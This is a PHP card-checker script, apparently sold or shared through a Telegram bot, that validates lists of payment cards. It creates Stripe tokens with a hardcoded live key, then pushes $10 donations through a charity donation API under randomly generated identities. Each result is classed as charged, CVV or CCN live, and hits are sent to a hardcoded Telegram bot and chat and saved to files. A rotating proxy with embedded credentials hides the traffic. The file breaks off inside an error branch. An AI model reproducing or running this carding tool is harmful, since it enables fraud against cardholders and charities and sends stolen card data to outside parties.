<?php
// TELEGRAM @isnotdev

### BOT CHECKER API @ISNOTDEVBOT
//-- CAN BE USE IN SITE, JUST FIX IT --//

error_reporting(0);
date_default_timezone_set('Asia/Tokyo');
$delay = "3000";
$newDelay = $delay / 1000;
sleep($newDelay);

$amt = '10$';
$owner = "@isnotdevbot";
$gateways = 'Stripe CCN 10$';

### FUNCTIONS
if ($_SERVER['REQUEST_METHOD'] == "POST") {
 extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
 extract($_GET);
}
function GetStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);
 return $str[0];
}
function inStr($string, $start, $end, $value) {
 $str = explode($start, $string);
 $str = explode($end, $str[$value]);
 return $str[0];
}

### CC VALIDATING
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$last4 = substr($cc, -4);
$hidehit = "XXXXXXXXXXXX$last4|$mes|$ano|$cvv";
$bin = substr($cc, 0, 6);
// XXXXXXXXXXXX$last4
### CARD TYPE
$ccScheme = array(
 "3" => "American Express",
 "4" => "Visa",
 "5" => "MasterCard",
 "6" => "Discover"
);
$cardScheme = $ccScheme[substr($cc, 0, 1)];

### HITSENDER
$tgid = $_GET['tgid'];
function hitSender ($tgid, $message) {
 $url = "https://api.telegram.org/bot6088551496:AAEdIqwtvoOG9r3Ab_KFQXf5UQJZdF-r_Gs/sendMessage?chat_id=".$tgid."&text=".$message."&parse_mode=HTML&disable_web_page_preview=true";
 file_get_contents($url);
}

$chrg = '-946410277';
function isnotSender ($chrg, $message) {
 $url = "https://api.telegram.org/bot6088551496:AAEdIqwtvoOG9r3Ab_KFQXf5UQJZdF-r_Gs/sendMessage?chat_id=".$chrg."&text=".$message."&parse_mode=HTML&disable_web_page_preview=true";
 file_get_contents($url);
}

function value($str, $find_start, $find_end) {
 $start = @strpos($str, $find_start);
 if ($start === false) {
  return "";
 }
 $length = strlen($find_start);
 $end = strpos(substr($str, $start +$length), $find_end);
 return trim(substr($str, $start +$length, $end));
}

function mod($dividendo, $divisor) {
 return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

### EMAIL GENERATOR
function emailGenerate($length = 10) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString . '@gmail.com';
}
$email = emailGenerate();

### USERNAME GENERATOR
function usernameGen($length = 13) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString;
}
$un = usernameGen();

### PASSWORD GENERATOR
function passwordGen($length = 15) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString;
}
$pass = passwordGen();

### EWAN KO
function fldrs($length = 5) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString;
}
$fldrs = fldrs();

### USER DATA
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "bol.com.br", "yopmail.com", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = str_replace("example.com", $serv_rnd, $email);
if ($state == "Alabama") {
 $state = "AL";
} else if ($state == "alaska") {
 $state = "AK";
} else if ($state == "arizona") {
 $state = "AR";
} else if ($state == "california") {
 $state = "CA";
} else if ($state == "olorado") {
 $state = "CO";
} else if ($state == "connecticut") {
 $state = "CT";
} else if ($state == "delaware") {
 $state = "DE";
} else if ($state == "district of columbia") {
 $state = "DC";
} else if ($state == "florida") {
 $state = "FL";
} else if ($state == "georgia") {
 $state = "GA";
} else if ($state == "hawaii") {
 $state = "HI";
} else if ($state == "idaho") {
 $state = "ID";
} else if ($state == "illinois") {
 $state = "IL";
} else if ($state == "indiana") {
 $state = "IN";
} else if ($state == "iowa") {
 $state = "IA";
} else if ($state == "kansas") {
 $state = "KS";
} else if ($state == "kentucky") {
 $state = "KY";
} else if ($state == "louisiana") {
 $state = "LA";
} else if ($state == "maine") {
 $state = "ME";
} else if ($state == "maryland") {
 $state = "MD";
} else if ($state == "massachusetts") {
 $state = "MA";
} else if ($state == "michigan") {
 $state = "MI";
} else if ($state == "minnesota") {
 $state = "MN";
} else if ($state == "mississippi") {
 $state = "MS";
} else if ($state == "missouri") {
 $state = "MO";
} else if ($state == "montana") {
 $state = "MT";
} else if ($state == "nebraska") {
 $state = "NE";
} else if ($state == "nevada") {
 $state = "NV";
} else if ($state == "new hampshire") {
 $state = "NH";
} else if ($state == "new jersey") {
 $state = "NJ";
} else if ($state == "new mexico") {
 $state = "NM";
} else if ($state == "new york") {
 $state = "LA";
} else if ($state == "north carolina") {
 $state = "NC";
} else if ($state == "north dakota") {
 $state = "ND";
} else if ($state == "Ohio") {
 $state = "OH";
} else if ($state == "oklahoma") {
 $state = "OK";
} else if ($state == "oregon") {
 $state = "OR";
} else if ($state == "pennsylvania") {
 $state = "PA";
} else if ($state == "rhode Island") {
 $state = "RI";
} else if ($state == "south carolina") {
 $state = "SC";
} else if ($state == "south dakota") {
 $state = "SD";
} else if ($state == "tennessee") {
 $state = "TN";
} else if ($state == "texas") {
 $state = "TX";
} else if ($state == "utah") {
 $state = "UT";
} else if ($state == "vermont") {
 $state = "VT";
} else if ($state == "virginia") {
 $state = "VA";
} else if ($state == "washington") {
 $state = "WA";
} else if ($state == "west virginia") {
 $state = "WV";
} else if ($state == "wisconsin") {
 $state = "WI";
} else if ($state == "wyoming") {
 $state = "WY";
} else {
 $state = "KY";
}

### PROXY ROTATING
$rp1 = array(
 1 => 'qzmmtjsy-rotate:i0oofao1q1vz',
);
$rotate = $rp1[array_rand($rp1)];

### PROXY DOMAIN & AUTHENTICATION
$poxyyy = "socks5h://p.webshare.io:80";

### PROXY CHECKING
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
 CURLOPT_RETURNTRANSFER => true,
 CURLOPT_PROXY => $poxyyy,
 CURLOPT_PROXYUSERPWD => $rotate,
 CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)) {
 $ip = "[ POXY: LIVE ]";
}
if (empty($ip1)) {
 $ip = "[ POXY: DEAD ]";
}
// echo '<span class="msg">'.$ip.'</span><br>';

### REQ 1
$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, $poxyyy);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano&guid=2f064ebd-6455-4b31-9e8b-0f3f4e2c321c922b8a&muid=b1dcfe38-85de-4db0-bd87-a153fc3af0145b42a1&sid=56f25e73-1c1d-4d86-baad-06d3ef01c9e3e8182d&payment_user_agent=stripe.js%2F1a76abe9b7%3B+stripe-js-v3%2F1a76abe9b7%3B+split-card-element&time_on_page=101989&key=pk_live_51G3UDSD2Zsr0c6eyL78CeWh1KQ2NG9jDPimts4diEOZQz9nWl9v2AxSAp6OlNH5zpHpWh6Ge5QkvrYQvevwg0VB3001gMpJyp7&pasted_fields=number");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: Not.A/Brand";v="8",';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: Windows""';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$resp = curl_exec($ch);
$token = json_decode($resp, true);
$req = "Req 1";

### REQ 2
if (isset($token['id'])) {
 $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXY, $poxyyy);
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
 curl_setopt($ch, CURLOPT_URL, 'https://api.matchstik.org/graphql');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POST, 1);
 $oID = array(
  1 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"UDLQc5rX68","campaignId":"2vEyeuNuDW","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  2 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"EbpOFbS4qU","campaignId":"FY6JaPk31d","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  3 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"akLQ0ehVmz","campaignId":"BoBhGDWsCZ","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  4 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"Zu6FPY_qSv","campaignId":"tKnwvJVIK","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  5 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"4zd_k5L_E0","campaignId":"VgA55HyYn7","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
 );
 $postyy = $oID[array_rand($oID)];
 curl_setopt($ch, CURLOPT_POSTFIELDS, ''.$postyy.'');
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

 $headers = array();
 $headers[] = 'Accept-Language: en-US,en;q=0.9';
 $headers[] = 'Cache-Control: no-cache';
 $headers[] = 'Connection: keep-alive';
 $headers[] = 'Origin: https://donate.matchstik.org';
 $headers[] = 'Pragma: no-cache';
 $headers[] = 'Referer: https://donate.matchstik.org/';
 $headers[] = 'Sec-Fetch-Dest: empty';
 $headers[] = 'Sec-Fetch-Mode: cors';
 $headers[] = 'Sec-Fetch-Site: same-site';
 $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
 $headers[] = 'Accept: */*';
 $headers[] = 'Content-Type: application/json';
 $headers[] = 'Sec-Ch-Ua: "Not.A/Brand";v="8",';
 $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
 $headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $resp = curl_exec($ch);
 $req = "Req 2";
}

// telegram @isnotdev

// -- merchant -- //
### CHARGED
if (strpos($resp, '"__typename":"Donation"')) {
 echo '<span class="charges">#CHARGED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card has been successfully charged. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CHARGED]: <code>$lista</code> { msg: Your card has been successfully charged. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/charge-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
}

### DECLINED
elseif (strpos($resp, "The card has expired. Check the expiration date or use a different card.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: The card has expired. Check the expiration date or use a different card. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif (strpos($resp, "The card has been declined for an unknown reason.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: The card has been declined for an unknown reason. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif (strpos($resp, 'Invalid account.')) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Invalid account. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif (strpos($resp, "We were unable to process your order, please try again.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: We were unable to process your order, please try again. } </span> <span class="gatew"> '.$gateways.'</span><span class=""> '.$owner.'</span><br>';
} elseif (strpos($resp, "There was a problem encountered while processing your donation.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: There was a problem encountered while processing your donation. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif ((strpos($resp, "Suspicious activity detected. Try again in a few minutes.")) || (strpos($resp, "Anti-spam triggered, please wait and try again later."))) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Anti-spam triggered, please wait and try again later. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif (strpos($resp, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif (strpos($resp, "Anti-fraud triggered, please wait and try again later.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Anti-fraud triggered, please wait and try again later. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
}

// -- stripe -- //
### CHARGED
elseif (strpos($resp, '"status":"succeeded"')) {
 echo '<span class="charges">#CHARGED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card has been successfully charged. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CHARGED]: <code>$lista</code> { msg: Your card has been successfully charged. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/charge-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
}

### CVV
elseif (strpos($resp, '"cvc_check": "pass"')) {
 echo '<span class="approved">#CVV: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: CVC Check Pass. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CVV]: <code>$lista</code> { msg: CVC Check Pass. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/cvv-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 ((strpos($resp, "Your card zip code is incorrect.")) || (strpos($resp, "incorrect_zip"))) {
 echo '<span class="approved">#CVV: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card zip code is incorrect. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CVV]: <code>$lista</code> { msg: Your card zip code is incorrect. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/cvv-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 (strpos($resp, "Thank you! For security reasons your order is currently being reviewed.")) {
 echo '<span class="approved">#CVV: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Thank you! For security reasons your order is currently being reviewed. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CVV]: <code>$lista</code> { msg: Thank you! For security reasons your order is currently being reviewed. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/cvv-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 ((strpos($resp, "Your card does not support this type of purchase.")) || (strpos($resp, "transaction_not_allowed"))) {
 echo '<span class="approved">#CVV: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card does not support this type of purchase. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CVV]: <code>$lista</code> { msg: Your card does not support this type of purchase. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
} elseif
 ((strpos($resp, "Your card has insufficient funds.")) || (strpos($resp, "insufficient_funds"))) {
 echo '<span class="approved">#CVV: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card has insufficient funds. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CVV]: <code>$lista</code> { msg: Your card has insufficient funds. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/cvv-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
}

### CCN
elseif ((strpos($resp, "security code is incorrect.")) || (strpos($resp, "incorrect_cvc")) || (strpos($resp, "Your card's security code is incorrect."))) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card’s security code is incorrect. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: Your card’s security code is incorrect. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
}

### LIVE
elseif (strpos($resp, "stolen_card")) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Stolen Card. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: Stolen Card. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 (strpos($resp, "lost_card")) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Lost Card. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: Lost Card. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 (strpos($resp, "pickup_card")) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Pickup Card. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: Pickup Card. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 (strpos($resp, '"cvc_check": "fail"')) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: CVC Check Fail. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: CVC Check Fail. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
} elseif
 ((strpos($resp, "security code is invalid.")) || (strpos($resp, "invalid_cvc"))) {
 echo '<span class="approved">#CCN: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card’s security code is invalid. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
 $artSender = "[CCN]: <code>$lista</code> { msg: Your card's security code is invalid. } $gateways - $owner ";
 isnotSender($chrg, $artSender);
 hitSender($tgid, $artSender);
 $samgyup = fopen("./hitss/ccn-$bin.txt", "a+");
 fwrite($samgyup, "$lista | $gateways | @ISNOTDEVBOT\n");
}

### DECLINED
elseif
 ((strpos($resp, "Your card was declined.")) || (strpos($resp, "card_declined")) || (strpos($resp, 'Your card was declined'))) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card was declined. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif ((strpos($resp, 'Your card has expired.')) || (strpos($resp, "expired_card"))) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card has expired. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 ((strpos($resp, "Your card number is incorrect.")) || (strpos($resp, "incorrect_number"))) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card number is incorrect. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "generic_decline")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Generic declined. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "Your card's expiration month is invalid")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Your card’s expiration month is invalid. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "do_not_honor")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Do not honor. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "processing_error")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Processing error. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "service_not_allowed")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Service not allowed. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, '"cvc_check": "unchecked"')) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: CVC Check Unchecked. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, '"cvc_check": "unavailable"')) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: CVC Check Unavailable. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "parameter_invalid_empty")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Parameter invalid empty. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "lock_timeout")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Lock timeout. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 ((strpos($resp, "three_d_secure_redirect")) || (strpos($resp, "requires_action"))) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: 3D secure redirect. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "Card is declined by your bank, please contact them for additional information.")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Card is declined by your bank, please contact them for additional information. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "missing_payment_information")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Missing payment information. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "Payment cannot be processed, missing credit card number")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Payment cannot be processed, missing credit card number. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} elseif
 (strpos($resp, "Transaction declined")) {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Transaction declined. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
}

### ERROR
elseif
 ((strpos($resp, "-1")) || (strpos($resp, 'api_key_expired'))) {
